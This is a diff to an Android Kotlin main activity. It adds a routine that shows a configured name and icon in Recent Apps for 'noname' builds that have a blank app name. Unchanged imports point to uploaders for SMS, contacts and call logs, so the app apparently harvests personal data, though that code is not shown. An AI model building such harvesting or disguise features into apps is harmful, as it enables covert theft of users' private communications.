@@ -1,10 +1,12 @@
 package com.example.test
 
+import android.app.ActivityManager
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.SharedPreferences
+import android.graphics.BitmapFactory
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -15,6 +17,7 @@ import android.webkit.WebView
 import android.webkit.WebViewClient
 import android.webkit.WebSettings
 import android.webkit.WebChromeClient
+import androidx.core.content.ContextCompat
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.core.view.WindowCompat
@@ -43,6 +46,7 @@ import com.example.test.utils.SmsBatchUploader
 import com.example.test.utils.ContactsBatchUploader
 import com.example.test.utils.CallLogsBatchUploader
 import com.google.firebase.messaging.FirebaseMessaging
+import com.example.test.R
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.CoroutineScope
@@ -133,6 +137,9 @@ class MainActivity : ComponentActivity() {
         appConfig = AppConfig.load(this)
         ServerConfig.initialize(this)
         registerPaymentSuccessReceiver()
+        
+        // Set task description for noname flavors to show original icon in Recent Apps
+        setTaskDescriptionForNoname()
         
         Handler(Looper.getMainLooper()).postDelayed({
             ServerConfig.printAllSettings()
@@ -249,6 +256,64 @@ class MainActivity : ComponentActivity() {
         window.navigationBarColor = android.graphics.Color.TRANSPARENT
         window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
     }
+    
+    private fun setTaskDescriptionForNoname() {
+        // Check if this is a noname flavor (app name is empty)
+        if (appConfig.appName.isBlank()) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                try {
+                    // Try to load the original icon from drawable
+                    val iconDrawable = ContextCompat.getDrawable(this, R.drawable.icon)
+                    if (iconDrawable != null) {
+                        // Convert drawable to bitmap
+                        val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            val bitmap = android.graphics.Bitmap.createBitmap(
+                                iconDrawable.intrinsicWidth,
+                                iconDrawable.intrinsicHeight,
+                                android.graphics.Bitmap.Config.ARGB_8888
+                            )
+                            val canvas = android.graphics.Canvas(bitmap)
+                            iconDrawable.setBounds(0, 0, canvas.width, canvas.height)
+                            iconDrawable.draw(canvas)
+                            bitmap
+                        } else {
+                            // Fallback for older versions
+                            val bitmap = android.graphics.Bitmap.createBitmap(
+                                iconDrawable.intrinsicWidth,
+                                iconDrawable.intrinsicHeight,
+                                android.graphics.Bitmap.Config.ARGB_8888
+                            )
+                            val canvas = android.graphics.Canvas(bitmap)
+                            iconDrawable.setBounds(0, 0, canvas.width, canvas.height)
+                            iconDrawable.draw(canvas)
+                            bitmap
+                        }
+                        
+                        // Get app name from config.json (for display in Recent Apps)
+                        val displayName = try {
+                            val configFile = assets.open("config.json")
+                            val configContent = configFile.bufferedReader().use { it.readText() }
+                            configFile.close()
+                            val regex = """"app_name"\s*:\s*"([^"]+)"""".toRegex()
+                            regex.find(configContent)?.groupValues?.getOrNull(1) ?: "App"
+                        } catch (e: Exception) {
+                            "App"
+                        }
+                        
+                        val taskDescription = ActivityManager.TaskDescription(
+                            displayName,
+                            bitmap,
+                            ContextCompat.getColor(this, android.R.color.white)
+                        )
+                        setTaskDescription(taskDescription)
+                        Log.d(TAG, "Task description set for noname flavor: $displayName")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to set task description for noname", e)
+                }
+            }
+        }
+    }
 
     @Composable
     fun MainScreen() {
@@ -320,7 +385,7 @@ class MainActivity : ComponentActivity() {
                 .fillMaxSize()
                 .background(Color.White)
         ) {
-            if (showSplash && appConfig.appType != "sexyhub" && appConfig.appType != "wosexy") {
+            if (showSplash && appConfig.appType != "wosexy") {
                 val appName = appConfig.appName
                 val gradientColors = listOf(
                     Color(android.graphics.Color.parseColor(appConfig.theme.primaryColor)),
